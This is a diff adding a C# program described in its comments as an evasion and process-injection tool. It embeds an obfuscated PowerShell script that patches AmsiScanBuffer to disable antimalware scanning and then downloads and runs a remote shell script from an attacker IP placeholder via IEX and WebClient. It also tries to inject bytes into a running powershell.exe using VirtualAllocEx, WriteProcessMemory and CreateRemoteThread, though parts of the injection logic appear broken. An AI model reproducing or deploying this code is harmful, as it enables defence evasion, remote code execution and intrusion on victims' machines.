@@ -1,0 +1,90 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Text;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using static System.Net.Mime.MediaTypeNames;
+using System.Reflection.Emit;
+
+namespace XORandPROCInj
+{
+    class Program
+    {
+	//below is WIN32API calls that are responsible for certain functionalities to be able to execute our code using win32 API Calls to have sufficient permissions and stay away from the defences as much as possible
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
+    processId);
+
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
+        dwSize, uint flAllocationType, uint flProtect);
+
+
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+    byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
+    lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
+    dwCreationFlags, IntPtr lpThreadId);
+
+	//xor function to xor the commands 
+        private static byte[] xor(byte[] cipher, byte[] key)
+        {
+            byte[] xored = new byte[cipher.Length];
+
+            for (int i = 0; i < cipher.Length; i++)
+            {
+                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
+            }
+
+            return xored;
+        }
+
+        
+     
+        static void Main(string[] args)
+        {
+	    //key that would be used on the XOR process
+            string key = "$Sepastian$#@Exorcism";
+            //create a runspace	, the link from microsoft : https://learn.microsoft.com/en-us/powershell/scripting/developer/hosting/creating-runspaces?view=powershell-7.3
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            //open the runspace created earlier
+	    rs.Open();
+		//create the Powershell Process
+            PowerShell ps = PowerShell.Create();
+	
+            ps.Runspace = rs;
+	     //inspired by https://github.com/No0neIsSafe/BashKill
+	    //string cmd would include the string that would run on Powershell 
+           string cmd = "$vxck = @\"\r\n0xb8\r\n\"@\r\n$uixn = @\"\r\n0x57\r\n\"@\r\n$bxny = @\"\r\n0x00\r\n\"@\r\n$rxqr = @\"\r\n0x07\r\n\"@\r\n$yzex = @\"\r\n0x80\r\n\"@\r\n$gbrq = @\"\r\n0xC3\r\n\"@\r\n$p = 0\r\n$7amada = [System.Runtime.InteropServices.Marshal]\r\n$ahh = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\npublic class afrcv {\r\n    [DllImport(\"kernel32\")]\r\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\r\n    [DllImport(\"kernel32\")]\r\n    public static extern IntPtr LoadLibrary(string name);\r\n    [DllImport(\"kernel32\")]\r\n    public static extern bool Virtual\r\n\"@\r\n$hh = @\"\r\nProtect(IntPtr lpAddress, UIntPtr odwsuy, uint flNewProtect, out uint lpflOldProtect);\r\n}\r\n\"@\r\n$afrcv = $ahh+$hh\r\nAdd-type -TypeDefinition $afrcv\r\n$wzqprfk = [afrcv]::LoadLibrary(\"$(('àmsî.'+'dll').NoRMAlize([chaR]([byte]0x46)+[cHAR](111+94-94)+[CHar](34+80)+[cHaR](109*91/91)+[CHaR]([bYTe]0x44)) -replace [chAR]([byte]0x5c)+[CHaR]([byTe]0x70)+[cHAR]([BYTe]0x7b)+[CHar]([ByTE]0x4d)+[cHAR]([BYTe]0x6e)+[ChAr](125+8-8))\")\r\n$npmjpz = [afrcv]::GetProcAddress($wzqprfk, \"A\"+\"m\"+\"si\" + \"S\"+\"c\"+\"an\" + \"Bu\"+\"f\"+\"f\"+\"er\")\r\n[afrcv]::VirtualProtect($npmjpz, [uint32]5, 0x40,[ref]$p)\r\n$acyyr = [Byte[]] ($vxck,$uixn,$bxny,$rxqr,+$yzex,+$gbrq)\r\n$7amada::Copy($acyyr, 0, $npmjpz, 6)\r\n\r\n IEX (New-Object Net.WebClient).DownloadString('http://<AttackerIPAddress&Port>/<Name of the Shell>.ps1')";
+            //the code above is string, so it can't be put on the handle of the memory below to be written, so, we have to convert it to Bytes as shown below	
+	    byte[] bytes = Encoding.ASCII.GetBytes(cmd);
+	   //powershell running the string mentioned earlier
+            ps.AddScript(cmd);	
+            ps.Invoke();
+	    //empty array to xor the string mentioned earlier
+            byte[] shellcode;
+            //the shellcode earlier XOR the process
+          shellcode = xor( bytes , Encoding.ASCII.GetBytes(key));
+	     
+	     //the 2 lines below is searching for specific process to inject on, we choose powershell because it is more legitimate to find a powershell script on powershell process	
+       
+           Process[] processes = Process.GetProcessesByName("powershell.exe");
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processes[0].Id);
+	    //virtual allocation can be found more on PINVOKE online , this is responsible for allocating the space required for the process needed to be injected
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+          IntPtr outSize;
+	  //the process memory injected as we write our bytes using Write Process Memory, all of the injection is done using win32APIs	
+          WriteProcessMemory(hProcess, addr, bytes, cmd.Length, out outSize);
+           IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,IntPtr.Zero, 0, IntPtr.Zero);
+
+
+        }
+    }
+}
